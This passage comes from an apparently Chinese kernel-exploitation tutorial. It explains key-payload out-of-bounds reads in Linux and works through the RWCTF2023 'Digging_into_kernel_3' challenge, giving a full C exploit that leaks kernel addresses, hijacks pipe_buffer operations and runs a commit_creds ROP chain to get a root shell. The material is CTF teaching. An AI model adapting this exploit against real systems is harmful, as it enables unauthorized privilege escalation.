&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		ret = __keyctl_read_key(key, key_data, key_data_len);</span><br><span class="line"></span><br><span class="line">		<span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">/* payload 大于一张内存页，重新分配空间 */</span></span><br><span class="line">		<span class="keyword">if</span> (ret &gt; key_data_len) &#123;</span><br><span class="line">			<span class="keyword">if</span> (unlikely(key_data))</span><br><span class="line">				kvfree_sensitive(key_data, key_data_len);</span><br><span class="line">			key_data_len = ret;</span><br><span class="line">			<span class="keyword">continue</span>;	<span class="comment">/* Allocate buffer */</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (copy_to_user(buffer, key_data, ret))</span><br><span class="line">			ret = -EFAULT;</span><br><span class="line">	&#125;</span><br><span class="line">	kvfree_sensitive(key_data, key_data_len);</span><br><span class="line">	<span class="comment">//...</span></span><br></pre></td></tr></table></figure></div>
<p><code>__keyctl_read_key()</code> 的主要逻辑便是调用
<code>key-&gt;type-&gt;read(key, buffer, buflen);</code>，对于 type 为
<code>"user"</code> 而言应当为 <code>user_read()</code>，本质上就是一个
<code>memcpy()</code>：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">user_read</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> key *key, <span class="type">char</span> *buffer, <span class="type">size_t</span> buflen)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">user_key_payload</span> *<span class="title">upayload</span>;</span></span><br><span class="line">	<span class="type">long</span> ret;</span><br><span class="line"></span><br><span class="line">	upayload = user_key_payload_locked(key);</span><br><span class="line">	ret = upayload-&gt;datalen;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* we can return the data as is */</span></span><br><span class="line">	<span class="keyword">if</span> (buffer &amp;&amp; buflen &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (buflen &gt; upayload-&gt;datalen)</span><br><span class="line">			buflen = upayload-&gt;datalen;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">memcpy</span>(buffer, upayload-&gt;data, buflen);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h4 id="数据泄露-7">数据泄露</h4>
<p>这里我们可以注意到其拷贝的数据长度限制为
<code>payload-&gt;datalen</code>，如果我们能够用某种方式更改 payload
头部的 <code>datalen</code>
为一个更大值，便能完成内核空间中的越界读取，同时由于其使用先分配一个
<code>buflen/datalen</code>
长度的临时对象进行数据拷贝后再将临时对象上数据拷贝到用户空间的方式，因此不会触发
hardened usercopy 的检查（需要看具体版本实现）。</p>
<h3 id="keyctl_unlink---释放整个-key">KEYCTL_UNLINK - 释放整个 key</h3>
<p>该选项对应调用的是 <code>keyctl_keyring_unlink()</code>
，其最后会调用到 <code>key_unlink()</code> 进行资源的释放：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">key_unlink</span><span class="params">(<span class="keyword">struct</span> key *keyring, <span class="keyword">struct</span> key *key)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">assoc_array_edit</span> *<span class="title">edit</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">	key_check(keyring);</span><br><span class="line">	key_check(key);</span><br><span class="line"></span><br><span class="line">	ret = __key_unlink_lock(keyring);</span><br><span class="line">	<span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">	ret = __key_unlink_begin(keyring, key, &amp;edit);</span><br><span class="line">	<span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">		__key_unlink(keyring, key, &amp;edit);</span><br><span class="line">	__key_unlink_end(keyring, key, edit);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2
id="例题rwctf2023体验赛-digging_into_kernel_3">例题：RWCTF2023体验赛-Digging_into_kernel_3</h2>
<p><a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/linux_kernel_pwn/RWCTF2023%E4%BD%93%E9%AA%8C%E8%B5%9B-Digging_into_kernel_3" >附件下载链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>有一个无限的 free 功能和一个 kmalloc + 写 的功能。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( a2 == <span class="number">0xC0DECAFE</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !copy_from_user(&amp;input, a3, <span class="number">16LL</span>) &amp;&amp; input.index &lt;= <span class="number">1u</span> )</span><br><span class="line">    kfree(buf[input.index]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line">v3 = <span class="number">-1LL</span>;</span><br><span class="line"><span class="keyword">if</span> ( a2 == <span class="number">0xDEADBEEF</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( copy_from_user(&amp;input, a3, <span class="number">16LL</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  index = (<span class="type">unsigned</span> <span class="type">int</span>)input.index;</span><br><span class="line">  <span class="keyword">if</span> ( input.index &gt; <span class="number">1u</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  buf[index] = _kmalloc((<span class="type">unsigned</span> <span class="type">int</span>)input.size, <span class="number">0xDC0</span>LL);</span><br><span class="line">  v6 = buf[input.index];</span><br><span class="line">  <span class="keyword">if</span> ( !v6 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)input.size &gt; <span class="number">0x7FFFFFFF</span>uLL )</span><br><span class="line">    BUG();</span><br><span class="line">  <span class="keyword">if</span> ( copy_from_user(v6, input.buf, (<span class="type">unsigned</span> <span class="type">int</span>)input.size) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>由于 <code>key</code> 的 <code>description</code>
限制大，因此我们只使用它的 <code>payload</code> 部分。并且为了避免
<code>description</code> 对利用造成影响，整个利用过程中
<code>description</code> 大小不能和相关的 object 有交集。</p>
<p>首先堆风水申请两个相邻的 <code>user_key_payload</code> 然后改大前一个
<code>user_key_payload</code> 的 <code>datalen</code> 并释放后一个
<code>user_key_payload</code> 。由于
<code>user_key_payload.rcu.func</code>
在释放时会写入内核地址，因此我们可以越界读前一个
<code>user_key_payload</code> 泄露内核地址。</p>
<p>之后我们使用 <code>pipe_inode_info</code> + <code>pipe_buffer</code>
劫持程序流实现提权。</p>
<p>首先我们堆风水使得一个我们可控的 <code>pipe_inode_info</code> 大小的
object 被 <code>user_key_payload</code> 使用。然后释放这个 object
以及一个 <code>pipe_buffer</code> 大小的 object。</p>
<p>创建一个 pipe 使得这两个object 被 <code>pipe_inode_info</code> 和
<code>pipe_buffer</code> 使用，此时我们可以通过读取
<code>user_key_payload</code> 获取 <code>pipe_buffer</code>
的地址。这里由于 <code>user_key_payload</code> 的 <code>datalen</code>
被 <code>pipe_inode_info</code> 改为了 0xFFFF 因此我们需要让
<code>key_read</code> 传入的 <code>buflen</code>
足够长才能读取出数据。</p>
<p>之后在劫持的 <code>pipe_buffer</code> 上伪造
<code>pipe_buf_operations</code> 并且写入 rop 提权。这里我们用到的
gadget 如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:FFFFFFFF81250C9D push    rsi</span><br><span class="line">.text:FFFFFFFF81250C9E pop     rsp</span><br><span class="line">.text:FFFFFFFF81250C9F cmp     rcx, rdx</span><br><span class="line">.text:FFFFFFFF81250CA2 jb      short loc_FFFFFFFF81250C85</span><br><span class="line">.text:FFFFFFFF81250CA4 pop     rbx</span><br><span class="line">.text:FFFFFFFF81250CA5 xor     eax, eax</span><br><span class="line">.text:FFFFFFFF81250CA7 pop     rbp</span><br><span class="line">.text:FFFFFFFF81250CA8 pop     r12</span><br><span class="line">.text:FFFFFFFF81250CAA jmp     __x86_return_thunk</span><br><span class="line">...</span><br><span class="line">.text:FFFFFFFF82003240 retn</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/keyctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span> &#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">qword_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] %s:\n&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_shell</span><span class="params">()</span> &#123; system(<span class="string">&quot;cat flag;/bin/sh&quot;</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_rflags, user_sp, user_ss;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="type">void</span> (*func)(<span class="keyword">struct</span> callback_head *head);</span><br><span class="line">&#125; __attribute__((aligned(<span class="keyword">sizeof</span>(<span class="type">void</span> *))));</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> rcu_head callback_head</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __aligned(x)                    __attribute__((__aligned__(x)))</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> u64;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_key_payload</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>        <span class="comment">/* RCU destructor */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> datalen;    <span class="comment">/* length of this data */</span></span><br><span class="line">    <span class="type">char</span> data[<span class="number">0</span>] __aligned(__alignof__(u64)); <span class="comment">/* actual data */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">key_alloc</span><span class="params">(<span class="type">void</span> *description, <span class="type">void</span> *payload, <span class="type">int</span> payload_len)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_add_key, <span class="string">&quot;user&quot;</span>, description, payload, payload_len, KEY_SPEC_PROCESS_KEYRING);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">key_update</span><span class="params">(<span class="type">int</span> keyid, <span class="type">void</span> *payload, <span class="type">size_t</span> plen)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_UPDATE, keyid, payload, plen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">key_read</span><span class="params">(<span class="type">int</span> keyid, <span class="type">void</span> *buffer, <span class="type">size_t</span> buflen)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_READ, keyid, buffer, buflen);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">key_revoke</span><span class="params">(<span class="type">int</span> keyid)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_REVOKE, keyid, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">key_unlink</span><span class="params">(<span class="type">int</span> keyid)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_keyctl, KEYCTL_UNLINK, keyid, KEY_SPEC_PROCESS_KEYRING);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* read start from len to offset, write start from offset */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> &#123;</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * -&gt;confirm() verifies that the data in the pipe buffer is there</span></span><br><span class="line"><span class="comment">     * and that the contents are good. If the pages in the pipe belong</span></span><br><span class="line"><span class="comment">     * to a file system, we may need to wait for IO completion in this</span></span><br><span class="line"><span class="comment">     * hook. Returns 0 for good, or a negative error value in case of</span></span><br><span class="line"><span class="comment">     * error.  If not present all pages are considered good.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span> (*confirm)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * When the contents of this pipe buffer has been completely</span></span><br><span class="line"><span class="comment">     * consumed by a reader, -&gt;release() is called.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">void</span> (*release)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Attempt to take ownership of the pipe buffer and its contents.</span></span><br><span class="line"><span class="comment">     * -&gt;try_steal() returns %true for success, in which case the contents</span></span><br><span class="line"><span class="comment">     * of the pipe (the buf-&gt;page) is locked and now completely owned by the</span></span><br><span class="line"><span class="comment">     * caller. The page may then be transferred to a different mapping, the</span></span><br><span class="line"><span class="comment">     * most often used case is insertion into different file address space</span></span><br><span class="line"><span class="comment">     * cache.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span> (*try_steal)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Get a reference to the pipe buffer.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span> (*get)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> &#123;</span></span><br><span class="line">    <span class="type">u_int32_t</span> index;</span><br><span class="line">    <span class="type">u_int32_t</span> size;</span><br><span class="line">    <span class="type">void</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> rwctf_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">alloc</span><span class="params">(<span class="type">u_int32_t</span> index, <span class="type">u_int32_t</span> size, <span class="type">void</span> *buf)</span> &#123;</span><br><span class="line">    ioctl(rwctf_fd, <span class="number">0xDEADBEEF</span>, &amp;(<span class="keyword">struct</span> node) &#123;index, size, buf&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">(<span class="type">u_int32_t</span> index)</span> &#123;</span><br><span class="line">    ioctl(rwctf_fd, <span class="number">0xC0DECAFE</span>, &amp;(<span class="keyword">struct</span> node) &#123;.index=index&#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_INODE_INFO_SIZE  192</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_BUFFER_SIZE  1024</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> USER_KEY_PAYLOAD_SIZE 0x40</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> push_rsi_pop_rsp_pop_rbx_pop_rbp_pop_r12_ret = <span class="number">0xffffffff81250c9d</span>;</span><br><span class="line"><span class="type">size_t</span> pop_rdi_ret = <span class="number">0xffffffff8106ab4d</span>;</span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0xFFFFFFFF82850580</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0xFFFFFFFF81095C30</span>;</span><br><span class="line"><span class="type">size_t</span> swapgs_restore_regs_and_return_to_usermode = <span class="number">0xFFFFFFFF81E00ED0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    bind_core(<span class="number">0</span>);</span><br><span class="line">    save_status();</span><br><span class="line">    rwctf_fd = open(<span class="string">&quot;/dev/rwctf&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (rwctf_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to open rwctf.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *buf = (<span class="type">size_t</span> *) mmap(<span class="literal">NULL</span>, <span class="number">0x4000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x4000</span>);</span><br><span class="line"></span><br><span class="line">    alloc(<span class="number">0</span>, USER_KEY_PAYLOAD_SIZE, buf);</span><br><span class="line">    alloc(<span class="number">1</span>, USER_KEY_PAYLOAD_SIZE, buf);</span><br><span class="line">    delete(<span class="number">1</span>);</span><br><span class="line">    delete(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> key_payload_data_size = USER_KEY_PAYLOAD_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> user_key_payload);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;a&#x27;</span>, key_payload_data_size);</span><br><span class="line">    <span class="type">int</span> key_id0 = key_alloc(<span class="string">&quot;0&quot;</span>, buf, key_payload_data_size);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;b&#x27;</span>, key_payload_data_size);</span><br><span class="line">    <span class="type">int</span> key_id1 = key_alloc(<span class="string">&quot;1&quot;</span>, buf, key_payload_data_size);</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">memset</span>(((<span class="keyword">struct</span> user_key_payload *) buf)-&gt;data, <span class="string">&#x27;c&#x27;</span>, key_payload_data_size);</span><br><span class="line">    <span class="type">size_t</span> key_payload_oob_size = key_payload_data_size + USER_KEY_PAYLOAD_SIZE;</span><br><span class="line">    ((<span class="keyword">struct</span> user_key_payload *) buf)-&gt;datalen = key_payload_oob_size;</span><br><span class="line">    alloc(<span class="number">0</span>, USER_KEY_PAYLOAD_SIZE, buf);</span><br><span class="line"></span><br><span class="line">    key_revoke(key_id1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] key read length: %p\n&quot;</span>, key_read(key_id0, buf, key_payload_oob_size));</span><br><span class="line">    qword_dump(<span class="string">&quot;leak kernel address from user_key_payload.rcu.head&quot;</span>, buf, key_payload_oob_size);</span><br><span class="line">    <span class="type">size_t</span> kernel_offset = buf[<span class="number">6</span>] - <span class="number">0xffffffff813d8210</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] kernel offset: %p\n&quot;</span>, kernel_offset);</span><br><span class="line"></span><br><span class="line">    push_rsi_pop_rsp_pop_rbx_pop_rbp_pop_r12_ret += kernel_offset;</span><br><span class="line">    pop_rdi_ret += kernel_offset;</span><br><span class="line">    init_cred += kernel_offset;</span><br><span class="line">    commit_creds += kernel_offset;</span><br><span class="line">    swapgs_restore_regs_and_return_to_usermode += kernel_offset;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    alloc(<span class="number">0</span>, PIPE_INODE_INFO_SIZE, buf);</span><br><span class="line">    alloc(<span class="number">1</span>, PIPE_INODE_INFO_SIZE, buf);</span><br><span class="line">    delete(<span class="number">1</span>);</span><br><span class="line">    delete(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> pipe_key_id = key_alloc(<span class="string">&quot;pipe&quot;</span>, buf, PIPE_INODE_INFO_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> user_key_payload));</span><br><span class="line">    delete(<span class="number">1</span>);<span class="comment">// pipe_inode_info pipe_key_id</span></span><br><span class="line">    alloc(<span class="number">0</span>, PIPE_BUFFER_SIZE, buf);</span><br><span class="line">    delete(<span class="number">0</span>);<span class="comment">// pipe_buffer</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line">    pipe(pipe_fd);</span><br><span class="line">    key_payload_data_size = PIPE_INODE_INFO_SIZE - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> user_key_payload);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] key read length: %p\n&quot;</span>, key_read(pipe_key_id, buf, <span class="number">-1</span>));</span><br><span class="line">    qword_dump(<span class="string">&quot;get pip_buffer addr from pipe_inode_info&quot;</span>, buf, key_payload_data_size);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> pipe_buffer_addr = buf[<span class="number">16</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] pipe_buf addr: %p\n&quot;</span>, pipe_buffer_addr);</span><br><span class="line">    ((<span class="keyword">struct</span> pipe_buffer *) buf)-&gt;ops = (<span class="type">void</span> *) (pipe_buffer_addr + <span class="number">0x100</span>);</span><br><span class="line">    ((<span class="keyword">struct</span> pipe_buf_operations *) (((<span class="type">char</span> *) buf) + <span class="number">0x100</span>))-&gt;release = (<span class="type">void</span> *) push_rsi_pop_rsp_pop_rbx_pop_rbp_pop_r12_ret;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> rop_idx = <span class="number">0</span>;</span><br><span class="line">    <span class="type">size_t</span> *rop = &amp;buf[<span class="number">3</span>];</span><br><span class="line">    rop[rop_idx++] = pop_rdi_ret;</span><br><span class="line">    rop[rop_idx++] = init_cred;</span><br><span class="line">    rop[rop_idx++] = commit_creds;</span><br><span class="line">    rop[rop_idx++] = swapgs_restore_regs_and_return_to_usermode + <span class="number">0x31</span>;</span><br><span class="line">    rop[rop_idx++] = <span class="number">0</span>;</span><br><span class="line">    rop[rop_idx++] = <span class="number">0</span>;</span><br><span class="line">    rop[rop_idx++] = <span class="number">114514</span>;</span><br><span class="line">    rop[rop_idx++] = user_cs;</span><br><span class="line">    rop[rop_idx++] = user_rflags;</span><br><span class="line">    rop[rop_idx++] = user_sp;</span><br><span class="line">    rop[rop_idx++] = user_ss;</span><br><span class="line">    signal(SIGSEGV, get_shell);</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">0</span>);</span><br><span class="line">    alloc(<span class="number">0</span>, PIPE_BUFFER_SIZE, buf);</span><br><span class="line"></span><br><span class="line">    close(pipe_fd[<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h1 id="pgv-与页级内存页分配">pgv 与页级内存页分配</h1>
<p>内核网络协议栈中有很多值得深挖的结构体，其中 ring buffer 相关的
<code>packet_ring_buffer</code> 与 <code>pgv</code>
结构体可以帮我们完成页级的内存分配 &amp; 释放。</p>
<h2
id="packet_ring_buffer-pf_packet-模式下的-ring-buffer">packet_ring_buffer
：PF_PACKET 模式下的 ring buffer</h2>
